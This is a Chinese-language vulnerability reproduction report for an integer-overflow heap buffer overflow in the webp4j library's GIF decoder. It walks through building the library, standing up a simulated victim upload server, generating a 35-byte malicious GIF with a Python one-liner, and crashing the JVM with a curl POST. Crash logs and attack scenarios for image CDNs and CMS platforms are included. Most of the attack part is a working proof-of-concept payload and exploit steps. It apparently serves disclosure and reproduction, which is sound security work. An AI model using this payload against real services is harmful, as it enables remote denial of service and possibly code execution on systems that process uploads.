## webp4j 堆缓冲区溢出漏洞

### 漏洞原理

`gif_decoder.c` 中的 `DecodeGifFromMemory()` 从GIF文件的Logical Screen Descriptor读取画布宽高（16位，最大65535），然后计算 `canvas_size = width * height * 4`。该乘法使用 `int`（32位有符号）算术，当 `width=46341, height=46341` 时:

```
46341 × 46341 × 4 = 8,589,953,124 (真实值)
int32溢出结果 = 18,532 (一个很小的正数!)
```

`malloc(18532)` 成功分配18KB缓冲区，但随后 `ClearCanvas()` 尝试向其中写入8.5GB数据，造成**大规模堆缓冲区溢出**。

**漏洞代码** (`src/main/c/gif_decoder.c:153`):
```c
result->canvas_width = gif->SWidth;   // 来自GIF文件头 (攻击者控制)
result->canvas_height = gif->SHeight; // 来自GIF文件头 (攻击者控制)
int canvas_size = result->canvas_width * result->canvas_height * 4;  // 整数溢出!
uint8_t* canvas = (uint8_t*)malloc(canvas_size);  // malloc(18532) — 分配18KB
ClearCanvas(canvas, result->canvas_width, result->canvas_height, ...);  // 写入8.5GB!
```

### 复现步骤（使用MacOS复现）

#### 步骤1: 克隆项目（含子模块）

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home
export http_proxy="http://127.0.0.1:7890"
export https_proxy="http://127.0.0.1:7890"

cd /tmp/jni-vuln-reproduce
git clone --recursive https://github.com/MrNanko/webp4j.git
cd webp4j
```

#### 步骤2: 编译Native库 (CMake)

CMake会自动下载giflib 5.2.2并静态链接:

```bash
mkdir -p build && cd build
cmake -DCMAKE_BUILD_TYPE=Release ..
make -j8
```

验证编译结果:
```bash
file lib/libwebp4j-mac-arm64.dylib
# 输出: Mach-O 64-bit dynamically linked shared library arm64
```

#### 步骤3: 安装Native库到资源目录

```bash
cmake --install .
# 输出: Installing: .../src/main/resources/native/libwebp4j-mac-arm64.dylib
```

#### 步骤4: 编译Java类 (Maven)

```bash
cd /tmp/jni-vuln-reproduce/webp4j
mvn compile -DskipTests -Dgpg.skip=true
```

#### 步骤5: 创建受害者的服务器代码

创建 `VulnServerWebP.java` — 一个接收GIF上传并转换为WebP的HTTP服务（模拟图片CDN/CMS）:

```bash
cat > VulnServerWebP.java << 'JAVA_EOF'
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpExchange;
import dev.matrixlab.webp4j.WebPCodec;
import java.io.*;
import java.net.InetSocketAddress;

public class VulnServerWebP {
    public static void main(String[] args) throws Exception {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8080;
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);

        server.createContext("/api/convert/gif-to-webp", exchange -> {
            if (!"POST".equals(exchange.getRequestMethod())) {
                sendResponse(exchange, 405, "Method Not Allowed"); return;
            }
            byte[] gifData = exchange.getRequestBody().readAllBytes();
            System.out.println("[GIF->WebP] Received " + gifData.length + " bytes from " +
                exchange.getRemoteAddress());
            try {
                byte[] webpData = WebPCodec.encodeGifToWebP(gifData);
                if (webpData != null) {
                    System.out.println("[GIF->WebP] Converted to " + webpData.length + " bytes");
                    exchange.getResponseHeaders().set("Content-Type", "image/webp");
                    exchange.sendResponseHeaders(200, webpData.length);
                    exchange.getResponseBody().write(webpData);
                    exchange.getResponseBody().close();
                } else {
                    sendResponse(exchange, 400, "Conversion failed");
                }
            } catch (Exception e) {
                System.out.println("[GIF->WebP] Error: " + e);
                sendResponse(exchange, 500, "Error: " + e.getMessage());
            }
        });

        server.createContext("/health", exchange -> {
            sendResponse(exchange, 200, "OK");
        });

        server.setExecutor(null);
        server.start();
        System.out.println("=== webp4j VulnServer started on port " + port + " ===");
        System.out.println("POST /api/convert/gif-to-webp - GIF to WebP conversion");
    }

    private static void sendResponse(HttpExchange ex, int code, String body) throws IOException {
        byte[] b = body.getBytes();
        ex.sendResponseHeaders(code, b.length);
        ex.getResponseBody().write(b);
        ex.getResponseBody().close();
    }
}
JAVA_EOF

$JAVA_HOME/bin/javac -cp target/classes -d target/classes VulnServerWebP.java
```

#### 步骤6: 启动受害服务

```bash
$JAVA_HOME/bin/java -cp target/classes VulnServerWebP 8080 &
sleep 2
curl -s http://127.0.0.1:8080/health
# 输出: OK
```

#### 步骤7: 生成恶意GIF文件

构造一个仅35字节的GIF89a文件，Logical Screen Descriptor中的宽高设为46341×46341，但Image Descriptor中的实际图像仅1×1像素:

```bash
python3 -c "
import struct, sys
buf = bytearray()
buf += b'GIF89a'                              # GIF89a头
buf += struct.pack('<HH', 46341, 46341)       # 逻辑屏幕宽高: 46341x46341
buf += bytes([0x80, 0x00, 0x00])              # GCT标志=1, 2色, 背景=0
buf += bytes([0x00,0x00,0x00, 0xFF,0xFF,0xFF])# 全局颜色表 (黑+白)
buf += bytes([0x2C])                          # 图像分隔符
buf += struct.pack('<HH', 0, 0)              # 图像位置: (0,0)
buf += struct.pack('<HH', 1, 1)              # 图像尺寸: 1x1
buf += bytes([0x00])                          # 无局部颜色表
buf += bytes([0x02, 0x02, 0x4C, 0x01, 0x00]) # LZW压缩数据
buf += bytes([0x3B])                          # GIF结束符
sys.stdout.buffer.write(buf)
" > malicious.gif

ls -la malicious.gif
# 35 bytes — 一个合法的GIF文件，但画布尺寸会触发整数溢出
```

#### 步骤8: 发送恶意GIF — 触发堆溢出

```bash
curl -s -X POST --data-binary @malicious.gif http://127.0.0.1:8080/api/convert/gif-to-webp

# curl返回空响应或连接重置

sleep 1
curl -s --max-time 3 http://127.0.0.1:8080/health || echo "SERVER IS DOWN"
# 输出: SERVER IS DOWN
```

### 预期结果

服务端输出:
```
[GIF->WebP] Received 35 bytes from /127.0.0.1:XXXXX
#
# A fatal error has been detected by the Java Runtime Environment:
#
#  SIGSEGV (0xb) at pc=0x..., pid=XXXXX, tid=XXXXX
#
# Problematic frame:
# C  [libwebp4j-mac-arm64.dylib+0x2c11c]  ConvertRGBToY_NEON+0xcc
#
# The crash happened outside the Java Virtual Machine in native code.
```

**整个JVM进程因native代码中的堆缓冲区溢出而崩溃。** 攻击者仅需上传一个35字节的GIF文件即可实现远程DoS，且该溢出具有潜在的远程代码执行风险。

### 实际复现结果

```
[GIF->WebP] Received 35 bytes from /127.0.0.1:63620
#
#  SIGSEGV (0xb) at pc=0x000000010b82c11c, pid=1383, tid=24835
#
# Problematic frame:
# C  [webp4j-2753025955301377843-libwebp4j-mac-arm64.dylib+0x2c11c]  ConvertRGBToY_NEON+0xcc
#
# The crash happened outside the Java Virtual Machine in native code.
```

JVM crash log保存在: `hs_err_pid1383.log`

崩溃发生在 `ConvertRGBToY_NEON` 函数中，这是libwebp的颜色转换函数。崩溃路径为:
```
DecodeGifFromMemory()
  → malloc(18532)           // 溢出后的小值
  → ClearCanvas()           // 写入8.5GB到18KB缓冲区 → 堆溢出
  → WebPEncodeRGBA()        // 尝试编码已损坏的堆数据
    → ConvertRGBToY_NEON()  // 访问已损坏的内存 → SIGSEGV
```

---

## 整数溢出分析

| 宽度 | 高度 | width×height×4 (真实值) | int32结果 | 溢出? | 效果 |
|------|------|------------------------|-----------|-------|------|
| 100 | 100 | 40,000 | 40,000 | 否 | 正常 |
| 23170 | 23170 | 2,147,395,600 | 2,147,395,600 | 否 | 正常 (接近INT_MAX) |
| **23171** | **23171** | **2,147,580,964** | **-2,147,386,332** | **是** | malloc失败(负数) |
| **46341** | **46341** | **8,589,953,124** | **18,532** | **是** | **malloc(18KB)成功，写入8.5GB → 堆溢出!** |
| 65535 | 65535 | 17,179,344,900 | -524,284 | 是 | malloc失败(负数) |

**46341×46341是最危险的情况**: 溢出产生一个很小的正数(18532)，使malloc成功分配一个微小的缓冲区，随后的写操作远远超出缓冲区边界。

---

## 攻击场景总结

### jnicompressions (LZ4/Snappy)

**受影响的应用类型**:
- 消息队列消费者（接收压缩消息并解压）
- 数据管道（ETL中的解压步骤）
- RPC服务（使用LZ4/Snappy压缩的协议）
- 日志聚合系统（接收压缩日志）

**攻击成本**: 极低。LZ4攻击仅需8字节，Snappy攻击可使用任意随机数据。

### webp4j (GIF→WebP)

**受影响的应用类型**:
- 图片CDN（自动格式转换）
- CMS/博客平台（用户上传图片）
- 社交媒体后端（图片处理）
- 图片优化服务

**攻击成本**: 极低。恶意GIF文件仅35字节，是一个格式合法的GIF文件，可以通过任何文件上传接口提交。

---

## 文件清单

复现完成后，工作目录结构:

```
/tmp/jni-vuln-reproduce/
├── jnicompressions/                    # 从GitHub克隆的原始项目
│   ├── src/                            # 原始源码 (未修改)
│   ├── target/
│   │   ├── libcompressions.dylib       # 编译的native库
│   │   └── classes/                    # 编译的Java类 + VulnServer
│   ├── VulnServer.java                 # 模拟受害HTTP服务
│   └── hs_err_pid*.log                 # JVM崩溃日志
├── webp4j/                             # 从GitHub克隆的原始项目 (含libwebp子模块)
│   ├── src/                            # 原始源码 (未修改)
│   ├── build/
│   │   └── lib/libwebp4j-mac-arm64.dylib  # 编译的native库
│   ├── target/classes/                 # 编译的Java类 + VulnServerWebP
│   ├── VulnServerWebP.java            # 模拟受害HTTP服务
│   └── hs_err_pid*.log                # JVM崩溃日志
└── malicious_46341.gif                 # 35字节恶意GIF文件
```
